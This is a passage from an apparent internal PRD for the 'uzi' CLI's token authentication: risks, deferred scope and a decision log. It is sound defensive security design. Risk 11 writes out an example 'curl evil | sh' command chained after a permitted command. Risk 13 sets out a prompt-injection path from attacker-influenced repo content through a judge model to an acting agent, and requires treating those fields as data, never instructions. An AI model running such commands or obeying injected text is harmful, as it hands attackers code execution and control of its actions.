   in neither `All()` nor `AdminView().Values`. **Two caveats worth carrying**: (a) the `Sources`
   map *does* carry per-key source metadata (env vs db) for secret keys — metadata, not values, but
   it is now widened to a laptop file / CI log; (b) the safety rests on an **untyped, unenforced
   convention** (`Defaults ∩ SecretKeys = ∅`) guarded by that single test. If a future secret key
   were ever added to `Defaults`, this CLI would widen the leak. A compile-time guard would be
   better than a test; out of scope here, but the next person to add a secret setting must know.
10. **Real-time consent phishing.** `POST /api/auth/cli/start` is unauthenticated by necessity
    (the CLI has no credential yet), so **anyone can mint a `request_id` and send a logged-in
    victim the consent URL**. The victim's browser is already authenticated; one click mints the
    attacker a token. The design is RFC 8628-conformant (§3.3.1 display-and-compare, §5.4 consent
    screen) and the RFC is explicit that conformance **does not** stop a real-time phisher.
    Mitigations: the consent screen names the requesting **host** and requires the user to **type**
    the `user_code`; the 5-minute window bounds it. Residual accepted: a user who types a code an
    attacker sent them, into a screen naming a host they do not recognise, is phishable — the same
    residual every device-grant implementation carries. The countermeasure that would close it
    (binding the request to a pre-authenticated session) defeats the point: the CLI has no session.
11. **`SKILL.md` is a privileged artifact, and the trust direction is inward, not outward.** A
    compromised uzi *instance* **cannot** influence a user's Claude Code: the skill is `go:embed`ed
    at **build** time and the server is never in the loop (this was checked). The real direction is
    the supply chain: **whoever lands a commit in this repo writes
    `~/.claude/skills/uzi-cli/SKILL.md` on every installer's machine**, where it is loaded as
    *instructions* carrying `allowed-tools: Bash(uzi *)` — and uzi's own agents author MRs against
    this repo. It **is** review-gated, so this is **naming the artifact's class, not reporting a
    hole**: `api/internal/uzicli/skill/SKILL.md` deserves the same review attention as
    `.gitlab-ci.yml` or `agent/src/guardrails.ts`. Note the limit of M9's drift test: it constrains
    the command **list**, not the **prose** — an instruction-shaped change to the body passes it.
    **Unverified, and the coder must not assume otherwise**: whether `allowed-tools: Bash(uzi *)`
    is a prefix glob over the whole command string. If it is, `uzi x && curl evil | sh` may match
    it. Do not treat that frontmatter as a sandbox until someone establishes what it actually
    constrains.
12. **`publish_brew`'s safety depends on a GitLab setting that is invisible in this repo.**
    Verified against live GitLab: `v*` protected tags are **Maintainer(40) create-only** and
    `uzi-bot-vmocanu` is **Developer(30)**, so the bot **cannot** cut a `v*` tag and therefore
    cannot reach `TAP_WRITE_TOKEN` — the escalation is closed **today**. But that invariant lives
    only in a project setting: **if anyone relaxes `v*` create to Developer, `publish_brew` becomes
    agent-reachable**, and nothing in the repo would show it. **Explicit precondition: `v*` tag
    creation stays Maintainer-only.** Record the **blast-radius asymmetry** that makes this worse
    than the Harbor case: a leaked `HARBOR_PASSWORD` poisons uzi's own images, whereas
    `TAP_WRITE_TOKEN` writes a **shared** tap whose formula `install` blocks are **arbitrary Ruby
    executed on every engineer's laptop** — including engineers installing *example-app*, who never
    touched uzi. Scope the token to the tap repo, and prefer a **project** access token over a
    personal one.
13. **`uzi run review --json` turns judge free text into an agent-read channel from
    attacker-influenceable content. This risk is *created* by Decision 21 and did not exist before
    it.** *(Security audit, 2026-07-17, F-A — the third question the two prior audits never thought
    to ask: **"who consumes this payload, and does the swap change the consumer from a human
    reading escaped text to an agent that acts on it?"**)* The chain is real and needs no bug:
    repo/issue/CI content is attacker-influenceable → the judge LLM reads it in the trace
    (`handler/judge_worker.go:26-30`) → its output free text is **explicitly untrusted
    worker-controlled input** (`judge_worker.go:143-144`) → ingest strips control chars and three
    token shapes but **cannot strip instruction-shaped prose** → today the only consumer is the SPA
    rendering escaped text at a human, but after M7 `--json` feeds it to an agent, **and Decision 21
    celebrates exactly that** ("an agent that can read its own retrospective can act on it").
    Containment is real but partial: `verdict`, `category` and `confidence` are **closed enums
    validated at ingest** (`workersvc/judge_review.go:18-27`), and terminal-escape injection into
    the human rendering is already handled (`sanitizeReviewText` strips ESC,
    `judge_worker.go:370-383`). `target` / `rationale_md` / `summary_md` are **not** contained and
    cannot be. Mitigation is design-stage and cheap, so it is **required, not optional**: M7's
    SKILL.md and the `docs/judge.md` CLI section must state that those three fields are **data,
    never instructions** — the same standing the SPA already gives them — and that only
    `verdict`/`category`/`confidence` are safe to branch on. This is the inverse of Risk 11: there
    the untrusted instructions arrive from *our* supply chain, here from *the user's own forge
    content*, and both land in the same agent.
14. **A `uzc_` matches no scrubber uzi has — and this PRD is what mints it.** *(Security audit,
    2026-07-17, F-B.)* Neither `slacksvc.ScrubSecrets` (`slacksvc/redact.go:45-50`: slack,
    `sk-ant-`, `glpat-`) nor `snapshotSecretPatterns` (`handler/ci_fix.go:34-41`) knows the
    `uzc_`/`uza_` shape — nor `uzw_`, which predates this PRD. The chain is the one **this PRD
    instructs users to build**: it tells them to put `UZI_TOKEN` in GitLab CI → a `set -x` job
    echoes it → the trace enters a run → the judge quotes it into `summary_md` → `ScrubSecrets`
    passes it through → it is served over the newly-swapped `/review` **and** copied into the Slack
    DM path (`judge_worker.go:291`, same narrow scrub). Note `ci_fix.go`'s own comment already names
    *"Anthropic keys (sk-ant-…), the shape of a printed per-user token"* and the `set -x` echo — the
    scenario is one this repo has already designed for, in a scrubber the review path does not use.
    **M5 owns the fix** (it is where the token family is born): extend **both** redactors with the
    final shape (`uz[caw]_[A-Za-z0-9_-]{16,}` covers `uzw_` while we are here), and add a test
    sealing a literal token through the review ingest. **Introducing a credential family without
    teaching the redactors is Decision 18's error class in a new coat**: a rule this repo applies in
    two places and skips in the third, because the third did not look like a token surface.

## Out of scope (deferred)

- **Hosted worker provisioning** (`uzi worker provision`). PRD #58 is still Draft and its mechanism
  **already changed once mid-flight** (its header records the pivot from api-managed Deployments to
  a dedicated controller after a security audit); building a CLI verb on a moving contract
  guarantees rework, and hosted workers are not rolled out until #58's M6. Adding the verb later is
  additive — that is what the noun-verb tree is for. **This becomes the first live test of M11's
  rule.**
- **WebSocket `run logs --follow`.** REST polling `?after=<seq>` ships instead. Feasibility is
  **already proven, not unknown** — `/api/ws` authorizes owner-or-admin before the upgrade
  (`handler/ws.go:57`) and coder/websocket's `authenticateOrigin` **returns nil when `Origin` is
  empty** (`websocket@v1.8.14/accept.go:228-232`), and a CLI sends no `Origin`. A future PRD adds
  only a client; do not re-litigate feasibility.
- **`uzi run rejudge`** (`POST /api/runs/{id}/rejudge`). Reading the judge's verdict ships (Decision
  21); **re-running it does not**. It mints a token-spending run on the owner's Anthropic token, and
  the read verb is what both audiences asked for. Defensible later — it is owner-only and already
  behind a dedicated per-user spend limiter (`handler.go:551`), so the swap is one row plus a
  limiter-ordering check — but it is a **spend** decision, and spend is not read. Additive when
  wanted; the noun-verb tree is for exactly this.
- **Admin writes over the CLI** (cookie-only by routing), **vault access over the CLI**, `uzi context
  use` (the config file is already a context map), a `uzi update` command (brew is the only channel),
  and per-request admin audit logging (see Risk 8).

## Decision Log

1. **CLI tokens populate the same `userKey` via a new `RequireUser` dispatcher, presence-dispatched.**
   Every useful endpoint reads `mw.UserFromContext`, so anything else means rewriting handlers.
   Presence-dispatch (never fallback-on-failure) is what keeps the CSRF-checked branch
   unskippable. `RequireAuth` is left byte-identical so its existing tests still pin the browser
   path. *Corroborated by multica: one `Authorization` header, prefix-branched `mcn_`/`mul_`/JWT
   (`server/internal/middleware/auth.go:119,157`).* — architect.
2. **The CLI is not an OIDC client; it brokers a token off the session chokepoint.** *(architect
   proposed, rejecting both options the brief posed as a false dilemma; **user ratified**.)* Direct
   PKCE to the IdP needs a second client registration, makes uzi verify tokens whose `aud` is the
   CLI's client_id (a new "accept IdP assertion as login" trust surface), and is **dead on
   OIDC-disabled stacks** — the compose default. Round-tripping uzi's callback needs a `next`
   param, reopening the open-redirect PRD #45 Decision 3 closed on purpose. Both lose to the
   observation that uzi already has **one** place where a human proved who they are, which password
   *and* OIDC both converge on (`handler/oidc.go:163`).
3. **Poll, not a loopback listener** — the decisive evidence is multica's own source. Their
   listener needs `resolveCallbackBinding` topology heuristics, a `detectOutboundIP` UDP-dial
   trick, a `--callback-host` escape hatch (*"auto-detection can't know the right host"*), `tcp4`
   pinning for a macOS IPv6 bug, and printed `ssh -L` instructions because **the flow breaks over
   SSH**; it binds `0.0.0.0` on LAN topologies and receives the token as a **URL query param over
   plaintext HTTP**. Worst, `validateCliCallback` accepts **any RFC 1918 address**
   (`packages/views/auth/login-page.tsx:80-94`), so their login page hands a **full session JWT**
   to any private-network address in the URL. Polling deletes every line of that. — architect.
4. **One credential, two acquisition paths** (webui-minted static + browser-brokered), not two
   token types. One table, one middleware, one revocation surface. Reached independently, then
   confirmed as multica's model. — architect.
5. **Admin: read-only verbs over the CLI; writes cookie-only.** *(**User override** of the
   architect's recommendation to exclude admin entirely in v1.)* The architect's rationale was leak
   containment; the user judged the read verbs worth it. The split is enforced by **routing**, not a
   handler flag, so the failure mode "a read-only token reaches a write handler" is structurally
   impossible. Risk 8 records the residual the ruling does **not** dissolve.
6. **Password change / logout does **not** revoke CLI tokens — reaffirmed with the composition
   in full view.** *(Architect recommended GitHub-PAT semantics; **user ruled**, then **re-ruled
   after the security audit** surfaced the composition. Deliberately the user's call: it is a
   security-posture question, not a technical one.)* The audit's point was that three individually
   defensible properties compose badly: a token that is (a) potentially unbounded, (b) exempt from
   `token_version`, and (c) — pre-fix — cross-user capable. **The F1 fix removes (c)**; the user
   reaffirmed (a) + (b) with (c) gone. The accepted consequence, which must be **stated in the
   PRD and in the docs page in these words**: *a password change is NOT an incident-response
   control for CLI tokens; you must enumerate and revoke each one.* The corollary is that
   `last_used_at` + `token_prefix` are load-bearing forensics, not metadata — see Risk 8.
7. **A `scope` column, decided now because it has no safe retrofit** — **and enforced in
   `RequireUser`, not just at `/api/admin/*`.** Backfilling later to `'user'` silently breaks every
   admin's CLI; backfilling to `'admin_ro'` silently escalates every token in the wild. Neither is
   acceptable, and the table is empty today.
   **Correction (security audit, 2026-07-17):** an earlier version of this decision claimed that
   *without* scope "every token an admin mints would be factory-wide-read-capable" — implying the
   column fixed it. **It did not.** With `scope` consulted only by `RequireAdminRO`, an admin's
   default-scope `uzc_` **still** read every user's transcripts, because `GetRunForViewer` /
   `ListRunMessagesForViewer` (`workersvc/service.go:1379-1399`) read `IsAdmin` live and sit
   **outside** `/api/admin/*`. The column was a label on the admin routes. The ceiling is only real
   because `RequireUser` now injects an `IsAdmin=false` **copy** of the user row for non-`admin_ro`
   tokens.
   *Precision, because this is the entry that teaches the lesson and it must not itself
   over-claim:* the audit found F1 against the **group-swap** design, where `PATCH /api/repos/{id}`
   (`PatchRepo`'s two unscoped admin branches, `handler/forge.go:620-631`) was a **live** second
   consumer — an admin **write** on any user's repo. Against the design **as it now stands** that
   route is cookie-only, so it is double-covered and only the run-read consumers remain live. Both
   statements are true of their own design; conflating them would overstate the residual surface.
   **Amended by Decision 21:** swapping `GET /api/runs/{id}/review` makes `GetReviewForTarget` a
   **third** live consumer of the masking. This is the mechanism working as designed, not a
   regression — but it is precisely why the masking is a **copy of the user row** rather than a
   per-route check: each new swapped read inherits the ceiling for free, and the only cost is one
   more line in the ceiling test.
   Recorded because the M2 criteria as first written **would have gone green with the hole open** —
   the lesson is that the criteria must test the property, not the route prefix. Success Criteria 4
   was rewritten for the same reason (it had inherited the pre-F1 shape).
   — architect (design), auditor (found), architect (fix), reviewer (caught the criteria that had
   not learned it).
8. **Expiry: 90 days, unless it is a webui-minted `user`-scope token.** *(Q5: architect proposed the
   acquisition-path split as a refinement of multica's flat 90 days; **user adopted it** over the
   uniform "no expiry" they had first chosen. Residual A: **user ruled** `uza_` by scope on either
   path — and that ruling **fixed a gap in the architect's design**, which had `admin_ro` inheriting
   the acquisition path and would therefore have left a webui-minted `uza_` token unbounded.)*
   The server sets every lifetime; multica's client-chosen `expiresInDays := 90` (`cmd_auth.go:321`)
   is backwards.
9. **No `vendor/` — this reverses an earlier architect decision.** Under the original separate-repo
   shape, vendoring was near-mandatory: the CLI imported a **private** module, so `go build` at
   install time would have needed `GOPRIVATE` + git rewrites on every laptop, breaking the tap's
   "no credentials" promise. Decision 11 dissolved that: the CLI now imports only its own module,
   which brew clones. And the cost inverted — `go mod vendor` is **module-wide**, so it would vendor
   pgx/chi/go-oidc/goose into this repo *and* the mere presence of `vendor/` flips the whole module
   to `-mod=vendor`, changing how the **api server itself** builds in CI and its Dockerfile. A large
   invasive change to solve a problem that no longer exists. — architect (self-reversed).
10. **`token_prefix` + `revoked`, lifted from multica, diverging from uzi's own `workers` precedent.**
   `workers` stores `token_hash` alone and hard-deletes. A worker is disposable infrastructure; a
   PAT is a human-held credential whose leak investigation wants to know *when it was last used and
   when it was killed*. Soft delete also keeps the unique hash permanently poisoned against reuse.
   — architect.
11. **The CLI lives in this repo, at `api/cmd/uzi/`.** *(**User reversal** of their own earlier
    "separate repo" decision, prompted by the architect raising it as an open question at the
    zero-commit moment.)* The evidence was multica's `cmd_auth.go:21` importing
    `server/internal/auth` **directly** — a compile-time contract for free, with no public package,
    no pseudo-versions, no GOPRIVATE, no vendor. A separate module is not merely worse but
    **impossible without reintroducing that ceremony**: a module at `cli/` is not rooted at `api/`,
    so the Go internal rule forbids importing `api/internal/…`, leaving only a `go.work` or a
    versioned dependency on a sibling module in the same repo. *Counter-precedent answered:* PRD
    #58's controller **is** a separate module, deliberately — *"what keeps the kube client out of
    `api/go.mod`"* (`.gitlab-ci.yml:136-139`) and *"the only uzi component that will ever hold
    kube-apiserver credentials"* (`controller/go.mod:1-3`). That separation is about **trust** and a
    CVE-churning dep tree, and it deliberately does *not* import api internals; the CLI is the
    inverse on both counts. Accepted cost: cobra in `api/go.mod` means a cobra bump re-runs the
    api's gates — real, but small against `k8s.io/client-go`.
12. **`apitypes` survives the move, with a changed justification.** In-module it is no longer a
    contract carrier (the compiler does that for free); it is a **stdlib-only leaf** that keeps the
    server's runtime out of the CLI binary, guarded by a `go list -deps` assertion. — architect.
13. **The CLI rides uzi's `v*` tags.** It buys a property worth more than an independent cadence:
    `uzi version` == the API version the binary was compiled against, making the skew check exact.
    Two tag namespaces on one repo would break that. — architect.
14. **Skill: embedded, not fetched; content-hashed, not version-keyed; test-guarded, not
    source-mapped.** multica's `CLI_INSTALL.md` is fetched from GitHub `main` (`:10`), so it
    describes main rather than the installed binary — and it needs a **public** repo, which we are
    not. An embedded skill cannot describe a version other than the one running. Their
    `references/*-source-map.md` evidence discipline is the right idea done by hand; ours is a test,
    because our skill documents our own cobra tree. — architect.
15. **Claims that did not survive verification, recorded so the next reader does not inherit
    them.** (a) *"PRD #58 proves the contract-drift risk"* — **false**: #58's worker-DTO change adds
    `kind` and `hosted_size`, both **additive**, which Go's `encoding/json` ignores harmlessly. A
    hand-mirrored CLI would not have broken. #58 motivates M11's cross-component rule, **not** the
    contract mechanism. (b) *"Commit `vendor/`"* — reversed, see Decision 9. (c) *"the `scope`
    column makes the token a ceiling"* — **incomplete**, see Decision 7: true only once
    `RequireUser` injects `IsAdmin=false`. (d) *"swap `/api/me/*` (except vault)"* — a **category
    error**: `/api/vault/*` is its own route (`handler.go:292`), never under `/api/me/`, so the
    carve-out protected nothing, and the group-level swap would have exposed PAT-writing and
    secret-deleting endpoints. (e) *"No new limiter, so `Routes()` gains no parameter"* — wrong
    trade: `authLimiter`'s 10/min would have broken `uzi login` at poll #11. All five were held
    confidently before being checked. **(f)** *"a wrong verifier marks the request `denied`"* —
    **retracted by the auditor that proposed it**, and rightly: it contradicted the same
    paragraph's "roll back on mismatch" (a rollback undoes the marking), bought nothing against a
    32-random-byte verifier, and cost a login-DoS keyed on the **non-secret** `request_id`. Worth
    recording that a review finding was itself wrong — reviewers are not oracles, and this one
    caught its own error before we built it.
    The pattern is worth naming: **every one of (a)–(e) was an assertion about a *boundary* that
    had not been enumerated** — which is why this PRD now enumerates routes, DTOs and expiry cells
    explicitly rather than describing them by group. **(g)** `POST /api/workers` (Decision 18) is
    the same failure in its purest form: the boundary rule was *written down three times* and not
    applied to the fourth row. Enumeration is necessary but not sufficient — the rule has to be
    re-run against **every** row, not just the ones that prompted it.
16. **`/api/me/cli-tokens` is cookie-only, so `uzi logout` is local-only.** A Bearer-reachable
    token CRUD would let a stolen `uzc_` mint replacements (revocation becomes whack-a-mole) and
    would let an admin's stolen user-scope token mint a `uza_`, **escalating past the ceiling** —
    the mint check keys off the *user*, not the presenting credential's scope. The cost is that
    `uzi logout` cannot revoke server-side; it deletes the local credential and points at the
    webui. *(Rejected for v1: a Bearer-reachable `DELETE /api/me/cli-tokens/self` — defensible,
    since self-revoke cannot escalate, but a new endpoint for one verb when "revoke in the webui"
    is honest and already built.)* — architect, after review found the PRD had kept the `logout`
    command while dropping its semantics.
17. **The poll mint is claim-first, and a bad verifier mutates nothing.** "Inside a transaction" is
    not atomicity under READ COMMITTED — two concurrent polls would both read `approved` and both
    mint, yielding **two tokens from one approval**, invisible to a single-threaded test. The
    conditional `UPDATE … WHERE status='approved' RETURNING` *is* the guard, reusing the pattern
    uzi already applies to run claims (`FOR UPDATE SKIP LOCKED`) and proposals (claim-first).
    **A verifier mismatch rolls back and marks nothing** (see Decision 15(f)): marking `denied`
    would have been a login-DoS keyed on a **non-secret** `request_id`, and bought nothing against
    a 32-random-byte verifier. — architect (claim-first), auditor (found + then retracted its own
    `denied` recommendation), architect (applied the retraction).
18. **`POST /api/workers` is cookie-only: a CLI token must never mint a worker join token.**
    *(**Security audit**, second round; **user ruled** the fix.)* The chain is real and needs no
    admin: `uzc_` → `POST /api/workers` returns a plaintext `uzw_` (`handler/workers.go:394-397`) →
    register → `POST /api/worker/runs/claim` → `ClaimSecrets` = *"the **decrypted** secrets for
    this run only"*: `ForgePAT` + `AnthropicOAuthToken` (`workersvc/claim.go:120-129`). It defeats
    `secretbox` + PRD #32's vault by *asking over HTTPS* for what a DB dump could not recover, and
    the minted credentials **outlive revocation of the `uzc_`**. The uncomfortable part, recorded
    deliberately: this PRD **already contained the argument** — it excludes `/api/forge/*` because
    `POST /connections` *writes* a PAT, and Decision 16 refuses `/api/me/cli-tokens` because
    minting begets escalation — and simply failed to apply it one row down, to the strictly worse
    case (reading a PAT beats writing one; `uzc_`→`uzc_` is lateral, `uzc_`→`uzw_` is **upward**).
    A rule stated in three places and not applied in the fourth is a reasoning failure, not a typo.
    Cost: `uzi worker create` is a webui action, like `uzi logout`.
    **Why two independent reviews swept this same table and only one saw it — read this before
    sweeping it again.** The escalation is **cross-credential-class, not cross-user**. `POST
    /api/workers` is *genuinely* owner-scoped with no `IsAdmin` branch, so it answers "no" to the
    admin-widening question — the question F1 had just trained everyone to ask — while still being
    a **mint**. One validator swept for "consults `IsAdmin` **or mints anything**" and caught it;
    the other swept for admin-widening and cleared the row. **Owner-scoped and dangerous are not
    exclusive.** A future reader auditing this table will default to the admin question too; the
    second question is *"does this return a credential?"*, and it is the one that matters at a
    trust boundary between credential classes.
19. **`revoke-all` + `last_used_ip`: the Q6 ruling's own logic demanded a control and a signal.**
    *(**Security audit**, final round, answering "is documentation sufficient?" with a **no**;
    **user ruled both in**.)* This is an inference *from* the Q6 ruling, not a challenge to it: once
    no-expiry (Decision 8) and `token_version`-exemption (Decision 6) are both settled, **explicit
    revocation is the only control left** — Risk 8 says exactly that — and the PRD had left it as a
    manual N-click enumeration whose warning it repeated twice. **Repeating a warning is not a
    control; one button is** (`POST /api/me/cli-tokens/revoke-all`: one query, one index the schema
    already had). Likewise `last_used_at` answers *"was it used?"* when the question that drives
    the decision is *"was it used by someone who isn't me?"* — a legitimately-used and a
    stolen-and-used token are **byte-identical** on that list without `last_used_ip`, which is
    additionally the **only detection control** in a design that concedes it has no audit log. It
    rides the coarse ≤1/min write already mandated, so it is zero-marginal-cost. The lesson worth
    keeping: **a ruling that removes controls obliges you to re-derive what is left holding the
    weight** — we documented the gap thoroughly and mistook that for closing it.
20. **Runtime skew is a distribution problem, and co-locating the code does not fix it.** In-repo
    makes drift a build-time failure **for us**; it does nothing for a user running last month's
    brew binary against today's server. That user is protected by tolerant decoding (free —
    `encoding/json` ignores unknown fields), additive-only discipline on CLI-consumed endpoints (now
    reviewable in one MR), and the exact version handshake from Decision 13. *multica corroborates
    that co-location is not a cure*: their CLAUDE.md warns *"installed desktop clients can talk to
    newer backends"* and mandates schema-validated parsing plus a malformed-response test — with a
    same-repo CLI. — architect.
21. **`uzi run review` ships in v1: judge recommendations reach both audiences, `rejudge` does not.**
    *(**User ruling**, 2026-07-17, amending the route table's original "no v1 verb" on both judge
    routes.)* The requirement is that humans *and* agents can read the judge's output from the
    terminal. The read earns the swap on this PRD's own stated tests, and the split falls out of
    them:
    - **Least privilege** (the table's governing rule — "the surface widens when a verb needs it,
      not before") is a test of *whether a verb needs it*, not a presumption against widening. A
      verb now needs it.
    - **"Does it return a credential?"** (Decision 18's second question, the one that actually
      catches things) — no. Verdict, category, target, rationale, confidence. The fields are
      scrubbed at ingest by `validateAndScrubReview` (**`handler/judge_worker.go:329-364`** — the
      *mechanism*; an earlier draft cited `handler/judge.go:88-99`, which is a **DTO comment
      restating the claim**, not the code enforcing it. Citing the assertion instead of the
      enforcement is how an overstated guarantee survives review).
      **Stated at its true strength**: that gate runs `slacksvc.ScrubSecrets`, which covers
      **three** families (`slack`, `sk-ant-`, `glpat-` — `slacksvc/redact.go:45-50`), *not* the
      nine-GitLab-family + header-line + bare-`Bearer` set the repo's snapshot scrubber uses
      (`handler/ci_fix.go:34-41`). So the payload is scrubbed, not sterile.
      The **relative** claim still holds and is what licenses the swap: `run logs`
      (`/api/runs/{id}/messages`) has **no ingest scrubbing at all** and is already swapped, so
      this route's *marginal* exposure is ~zero. The absolute guarantee is weaker than "scrubbed"
      implies — see Risks 13 and 14.
    - **Does it widen authority?** No: `GetReviewForTarget` takes the same `(userID, isAdmin)` and
      is capped by the same `RequireUser` masking as `GetRunForViewer`. It adds a consumer, not a
      hole (Decision 7, amended).
    - **Is the payload agent-shaped?** More than most — and this one is **enforced, not just
      documented**: `RecommendationCategories` is a closed six-value map checked at ingest
      (`workersvc/judge_review.go:23-26`: `enable_tool`, `install_worker_tool`, `adjust_template`,
      `improve_agent`, `add_agent`, `improve_uzi`), as are `ReviewVerdicts`, `ReviewStatuses` and
      `RecommendationConfidences` (`:18-27`). A bad category is a rejected POST, not a stored
      surprise. So `--json`'s consumer gets a real enum + a target, not prose it must parse. An
      agent that can read its own retrospective can act on it; one that cannot must be told by a
      human reading a web page. That is the thin end of the self-improvement loop this factory is
      for. *(Cite the enum, not `docs/judge.md`: the doc **describes** the taxonomy, the map
      **is** it — and this PRD has already been bitten once by reading a value off that doc's UI
      copy, see M7's `failed`-not-`incomplete` note.)*
    - **What it costs, stated in the same breath as the benefit** *(security audit F-A, Risk 13)*:
      the very property that makes the payload agent-shaped makes it an **injection conduit** —
      `target`/`rationale_md`/`summary_md` are untrusted, instruction-shaped-capable text that
      after M7 flows to an agent instead of to an escaping human renderer. The enums are contained;
      the free text is not. **The ruling stands with that cost named**: the fix is a documentation
      contract (those fields are data, never instructions — M7 + `docs/judge.md`), not a reason to
      withhold the verb, because the alternative is an agent that cannot see its own retrospective
      at all. But an amendment that argued only the upside would have been the same failure as
      citing a comment instead of the mechanism.

    **`rejudge` fails a different test, which is why the two rows split.** It is not a read: it
    mints a run that spends the owner's Anthropic token. The route table already draws a
    *mint-vs-unmint* line one row up (the `DELETE /api/workers` row: destroying a worker exfiltrates
    nothing, minting one does), and the honest framing here is its sibling — *read vs spend*. `POST
    /api/repos/{id}/runs` is swapped and also spends — so this is a judgment call, not a rule — and
    the judgment is that the read is what was asked for and the spend can be added the day someone
    wants it. Recorded so a future reader does not "fix" the inconsistency by reflex in either
    direction.
    **And do not mistake it for a security boundary** *(security audit, 2026-07-17, answering
    "what does withholding rejudge buy?" with: **~nothing**)*. A stolen `uzc_` **already** spends
    the owner's Anthropic token at will via the swapped `POST /api/repos/{id}/runs` (behind only
    `forgeLimiter`, `handler.go:503`); rejudge is owner-only even for admins
    (`ErrNotRunOwner`, `workersvc/judge_review.go:87-88`) and carries a dedicated per-user spend
    limiter (`handler.go:551`), so it adds **no authority and marginal spend**. Withholding it is
    **API-surface discipline — product scope, not a control**. Anyone arguing later that "rejudge
    is excluded for security" is inventing a rationale this decision never claimed.

    **The near-miss worth recording**: the original table put both judge routes on one row under one
    justification ("no v1 verb"). That was true when written, but the row's *shape* — two verbs, one
    verdict — is what made it cheap to leave both out and easy to wave both in. **A route table row
    that bundles a read with a spend has already lost the distinction it exists to make.** The rows
    are split now. Same error class as Decision 18's: a rule applied three times and skipped on the
    fourth row, because the rows looked alike.

    **The audit of this amendment found the better lesson, and it is about the audits themselves.**
    Decision 18 recorded that the catching question is *"does this return a credential?"* — so this
    amendment asked it, and answered "no", correctly. The audit's F-A asked a **third** question
    nobody had asked in three rounds: ***"who consumes this payload, and does the swap change the
    consumer?"*** `/review`'s bytes are unchanged by the swap; **its reader is not** — SPA-escaping-
    text becomes an agent-that-acts. That is a real risk (Risk 13) invisible to both prior
    questions, because both interrogate the *payload* and this one interrogates the *consumer*.
    **The question list grows by one per audit, and that is the artifact worth keeping**: (1) does
    it widen admin authority? (2) does it return a credential? (3) does it change who consumes the
    payload, and what they do with it?
    The amendment also shipped two flaws of exactly the kind this PRD keeps a Decision 15 for: it
    cited a **DTO comment restating the scrubbing** instead of the function performing it, and it
    named a status value (`incomplete`) that **exists only as badge copy in a doc**, not in the
    enum. Both are the same mistake in different clothes — **trusting a description of the code
    instead of the code** — committed while amending a PRD whose Decision 15 is titled for that
    failure. Fixed in M7 and above.
    — user (ruling), reviewer (route-table + ceiling-test consequences), auditor (F-A/F-B, and the
    third question).
